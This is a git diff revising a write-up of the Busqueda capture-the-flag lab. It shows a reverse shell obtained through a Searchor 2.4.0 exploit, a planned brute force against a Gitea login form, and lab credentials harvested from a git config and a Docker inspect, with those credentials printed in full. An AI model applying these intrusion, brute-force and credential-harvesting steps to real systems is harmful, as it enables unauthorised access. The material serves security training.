@@ -136,7 +136,7 @@ Based on [testdriven.io](https://testdriven.io/blog/what-is-werkzeug/):
 
 >_werkzeug_ German noun: “tool”. Etymology: _werk_ (“work”), _zeug_ (“stuff”)
 >
-> **Werkzeug** _is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python_. **A WSGI (Web Server Gateway Interface)** _server is necessary for Python web applications since a web server cannot communicate directly with Python_. **WSGI is an interface between a web server and a Python-based web application**. _Put another way, **Werkzeug provides a set of utilities for creating a Python application that can talk to a WSGI server**._
+> **Werkzeug** _is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python_. **A WSGI (Web Server Gateway Interface)** _server is necessary for Python web applications since a web server cannot communicate directly with Python_. **WSGI is an interface between a web server and a Python-based web application**. _Put another way,_ **Werkzeug provides a set of utilities for creating a Python application that can talk to a WSGI server**.
 
 Searching known vulns for `Werkzeug/2.1.2` and `Python/3.10.6` did not return anything of interest.
 
@@ -146,7 +146,7 @@ Next steps:
 |----------|-----------------------------------------------------------------------------------------|
 | 1        | Try RCE PoC for `Searchor 2.4.0`                                                        |
 | 2        | Search known vulns for `Gitea 1.18.0`                                                   |
-| 3        | Brute force for users found under `/explore/organizations`: `cody` and `administrator`. |
+| 3        | Brute force for users found: `cody` and `administrator`. |
 
 Try RCE PoC for `Searchor 2.4.0`:
 
@@ -176,20 +176,23 @@ bash: cannot set terminal process group (1658): Inappropriate ioctl for device
 bash: no job control in this shell
 svc@busqueda:~$ cat ~/user.txt
 cat ~/user.txt
-0cd960c6e0b2ed34c9d74fa2976f8e0d
+<SNIP>
 ```
 
-Search known vulns for `Gitea 1.18.0` gives us nothing back. Let's try our brute force attack (BFA) the login form. In order to perform our BFA we need to obtain the required information: 
-- Is it a Basic Auth or Login Form?
-	- In our case it is the latter.
-- Is is a `GET` or a `POST` login form?
-	- If it passes parameters within the URL address bar, it is a `GET`, otherwise it is a `POST`.
-- What are the parameters?
-	- We can discover that using burp, zap, or just brower's tools.
-- What is unique on the page during a failed login attempt?
-	- We can find that by looking the page source code.
+Search known vulns for `Gitea 1.18.0` gives us nothing back. 
 
-1. When we attempt to login with random creds, no parameters are added to the URL address bar, such as `username` and `password`, so it is a `POST` form:
+Let's try to perform a brute force attack (BFA) against the login form. In order to perform our BFA we need to obtain the required information: 
+1. Does it use **Basic Authentication** or is it a **login form**?
+	- In our case it is a login form.
+2. Is it a `GET` or a `POST` login form?
+	- If it passes parameters within the URL address bar, it is a `GET`, otherwise it is a `POST`.
+3. What are the parameters?
+	- We can find them using burp, zap, or just brower's tools.
+4. What is unique on the page during a failed login attempt?
+	- We can find this by looking the page source code after a failed login attempt.
+
+
+1. When we attempt to login with random creds, no parameters are added to the URL address bar, such as `username` and `password`, which indicates that this is a `POST` login form:
 
 	![](testLogin.png)
 
@@ -197,7 +200,7 @@ Search known vulns for `Gitea 1.18.0` gives us nothing back. Let's try our brute
 
 	![](errorMsg.png){: .normal}
 
-3. The `POST` request parameters are: 
+3. The `POST` request parameters are `user_name` and `password`: 
 
 	![](postData.png)
 
@@ -206,7 +209,7 @@ Search known vulns for `Gitea 1.18.0` gives us nothing back. Let's try our brute
 	_csrf=KFFUC4l7C5mnfe_ObzIWX3rMLgs6MTcwNjU1NjQxOTE0Mjk5OTQwOQ&user_name=test&password=test
 	```
 
-4. Now, we are ready to create a user list with just the 2 usernames and attempt a dictionary attack:
+Now, we can create a wordlist with just the 2 usernames we have found and attempt our attack:
 
 	```bash
 	# create a user list
@@ -328,11 +331,11 @@ svc@busqueda:/var/www/app/.git$ cat .git/config
         merge = refs/heads/main
 ```
 
-We already know that there is a user `cody`, and the above file looks like it contains `cody`'s credentials for `gitea.searcher.htb`: `cody:jh1usoih2bkjaspwe92`. We can try using them for SSH access as well for both users, i.e., `cody` or `svc`:
+We already know that there is a user `cody`, and the above file looks like it contains `cody`'s credentials for `gitea.searcher.htb`: `cody:jh1usoih2bkjaspwe92`. We can try using the password to gain SSH access for both users, i.e., `cody` or `svc`, since the latter is a service account and it is highly susceptible to password reuse:
 
 ![](gitea_cody.png)
 
-Not much we can do from the sub-domain with a low-privileged account. Let's try to SSH:
+We were able to login as `cody`, but there is not much we can do from here with this low-privileged account. Let's try to SSH:
 
 ```bash
 # ssh as cody
@@ -428,7 +431,7 @@ svc@busqueda:/$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-insp
 <SNIP>
 ```
 
-The docker image above contains some credentials: `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF`, `MYSQL_USER=gitea`, and `MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh`. We can check if a MySQL server is listening and if there is one, try to log into it:
+The docker image above contains some credentials for the MySQL server: `MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF`, `MYSQL_USER=gitea`, and `MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh`. Let's use them to log in:
 
 ```bash
 # log into mysql
